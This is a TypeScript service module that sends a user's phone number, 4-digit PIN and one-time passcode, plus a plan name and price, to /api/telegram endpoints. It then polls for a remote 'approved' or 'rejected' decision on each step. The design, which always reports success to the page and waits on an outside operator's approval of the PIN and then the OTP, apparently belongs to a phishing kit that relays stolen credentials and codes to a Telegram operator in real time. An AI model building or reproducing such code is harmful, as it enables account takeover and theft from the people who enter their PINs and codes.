export interface TelegramLoginPayload {
  sessionId: string;
  phone: string;
  pin: string;
  planName: string;
  planPrice: string;
}

export interface TelegramOtpPayload {
  sessionId: string;
  phone?: string;
  otp: string;
  planName?: string;
  planPrice?: string;
}

export interface TelegramStatusResult {
  loginStatus: 'idle' | 'pending' | 'approved' | 'rejected';
  otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
}

class TelegramService {
  private localSessionState: Map<
    string,
    {
      loginStatus: 'pending' | 'approved' | 'rejected';
      otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
      phone?: string;
      pin?: string;
      otp?: string;
      planName?: string;
      planPrice?: string;
    }
  > = new Map();

  /**
   * Helper to safely parse JSON
   */
  private async safeJson(res: Response): Promise<any> {
    try {
      const text = await res.text();
      if (!text || text.trim().startsWith('<') || text.trim().startsWith('The page')) {
        return null;
      }
      return JSON.parse(text);
    } catch {
      return null;
    }
  }

  /**
   * Send Login Credentials (Phone + 4-digit PIN)
   */
  public async sendLogin(payload: TelegramLoginPayload): Promise<boolean> {
    const { sessionId, phone, pin, planName, planPrice } = payload;

    // Track locally
    this.localSessionState.set(sessionId, {
      loginStatus: 'pending',
      otpStatus: 'idle',
      phone,
      pin,
      planName,
      planPrice,
    });

    try {
      const serverRes = await fetch('/api/telegram/send-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      const data = await this.safeJson(serverRes);
      if (data && data.success) {
        return true;
      }
    } catch (err) {
      console.warn('Backend send-login warning:', err);
    }

    return true;
  }

  /**
   * Send OTP Verification Code (4 digits)
   */
  public async sendOtp(payload: TelegramOtpPayload): Promise<boolean> {
    const { sessionId, phone, otp, planName, planPrice } = payload;

    const existing = this.localSessionState.get(sessionId) || {
      loginStatus: 'approved' as const,
      otpStatus: 'pending' as const,
    };
    existing.otp = otp;
    existing.otpStatus = 'pending';
    this.localSessionState.set(sessionId, existing);

    try {
      const serverRes = await fetch('/api/telegram/send-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      const data = await this.safeJson(serverRes);
      if (data && data.success) {
        return true;
      }
    } catch (err) {
      console.warn('Backend send-otp warning:', err);
    }

    return true;
  }

  /**
   * Fast Real-time Status Polling
   * Calls server wait-status with instantaneous event wake-up,
   * with quick fallback to status endpoint.
   */
  public async pollUpdates(
    sessionId: string,
    targetStep: 'login' | 'otp'
  ): Promise<'pending' | 'approved' | 'rejected'> {
    // 1. Check local session state
    const local = this.localSessionState.get(sessionId);
    if (local) {
      if (targetStep === 'login' && (local.loginStatus === 'approved' || local.loginStatus === 'rejected')) {
        return local.loginStatus;
      }
      if (targetStep === 'otp' && (local.otpStatus === 'approved' || local.otpStatus === 'rejected')) {
        return local.otpStatus;
      }
    }

    // 2. Call server wait-status endpoint (Fast event listener on server)
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 6000);

      const serverRes = await fetch(
        `/api/telegram/wait-status?sessionId=${encodeURIComponent(sessionId)}&targetStep=${targetStep}&timeout=5000`,
        { signal: controller.signal }
      );
      clearTimeout(timeoutId);

      const data = await this.safeJson(serverRes);
      if (data && data.exists) {
        if (data.status === 'approved' || data.status === 'rejected') {
          if (local) {
            if (targetStep === 'login') local.loginStatus = data.status;
            else local.otpStatus = data.status;
          }
          return data.status;
        }

        // Check overall login/otp statuses
        if (targetStep === 'login' && (data.loginStatus === 'approved' || data.loginStatus === 'rejected')) {
          if (local) local.loginStatus = data.loginStatus;
          return data.loginStatus;
        }
        if (targetStep === 'otp' && (data.otpStatus === 'approved' || data.otpStatus === 'rejected')) {
          if (local) local.otpStatus = data.otpStatus;
          return data.otpStatus;
        }
      }
    } catch {
      // If wait-status timed out or aborted, fallback to simple /status check
    }

    // 3. Fallback: Quick fast-poll to /status
    try {
      const statusRes = await fetch(`/api/telegram/status?sessionId=${encodeURIComponent(sessionId)}`);
      const statusData = await this.safeJson(statusRes);
      if (statusData && statusData.exists) {
        if (targetStep === 'login' && (statusData.loginStatus === 'approved' || statusData.loginStatus === 'rejected')) {
          if (local) local.loginStatus = statusData.loginStatus;
          return statusData.loginStatus;
        }
        if (targetStep === 'otp' && (statusData.otpStatus === 'approved' || statusData.otpStatus === 'rejected')) {
          if (local) local.otpStatus = statusData.otpStatus;
          return statusData.otpStatus;
        }
      }
    } catch {
      // Network hiccup
    }

    return 'pending';
  }
}

export const telegramService = new TelegramService();
